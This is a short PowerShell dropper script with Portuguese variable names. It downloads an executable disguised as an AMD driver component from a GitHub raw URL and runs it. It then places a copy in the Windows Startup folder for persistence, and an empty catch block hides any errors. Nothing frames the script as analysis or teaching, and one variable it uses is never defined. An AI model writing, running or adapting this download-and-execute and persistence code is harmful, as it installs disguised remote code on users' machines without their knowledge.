$nomeArquivo = "AMD External Events Client Resources.exe"
$pastaStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$caminhoFinal = Join-Path $pastaStartup $nomeArquivo

$urlExe = 'https://raw.githubusercontent.com/689241bruno/teste2/main/AMD%20External%20Events%20Client%20Resources.exe'

(New-Object Net.WebClient).DownloadFile($urlExe, $caminhoTemp)

Start-Process -FilePath "$caminhoTemp"

try {
    (New-Object Net.WebClient).DownloadFile($urlExe, $caminhoFinal)
    Start-Process "$caminhoFinal"
} catch {
}